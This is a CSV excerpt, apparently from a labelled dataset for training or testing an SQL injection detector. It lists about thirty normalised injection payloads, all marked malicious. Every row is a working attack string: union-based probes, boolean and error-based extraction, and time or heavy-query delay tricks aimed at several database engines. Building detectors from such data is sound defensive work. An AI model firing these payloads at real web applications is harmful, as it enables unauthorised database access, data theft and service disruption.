row_index,payload_norm,label,sqli_type_hint
6150,"1%"" ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
6151,"1"" ) where 1300 = 1300 order by 1#",1,
6152,"-5691' union all select 6610,6610#",1,
6153,-1854' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,
6154,"1"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
6155,select ( case when ( 1743 = 5698 ) then 1743 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
6156,"1"" ) ) as aamh where 7432 = 7432 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
6157,"1 where 4319 = 4319 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
6158,"1' ) ) as vqrt where 5173 = 5173 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6159,1'|| ( select 'hshf' where 9073 = 9073 and 7533 = 7533 ) ||',1,
6160,-4289' or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'agnc' like 'agnc,1,
6161,"1' in boolean mode ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
6162,-2165' where 6593 = 6593 or 9158 = 7254--,1,
6163,"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",1,
6164,"select * from generate_series ( 1488,1488,case when ( 1488 = 1685 ) then 1 else 0 end ) limit 1--",1,
6165,"1%"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""%"" = """,1,
6166,"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",1,
6167,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ""cwat"" like ""cwat",1,
6168,"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",1,
6169,"-6681"" ) or 5251 = 1162",1,
6170,"1"" where 9756 = 9756",1,
6171,"1"" and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
6172,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",1,
6173,"1 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) -- ctdx",1,
6174,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",1,
6175,"1"" ) where 7514 = 7514",1,
6176,"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,1,
6177,"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'gmbd' = 'gmbd",1,
6178,"1, ( select ( case when ( 8392 = 8404 ) then 1 else 8392* ( select 8392 from information_schema.character_sets ) end ) )",1,
6179,"1' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'ykoz' = 'ykoz",1,
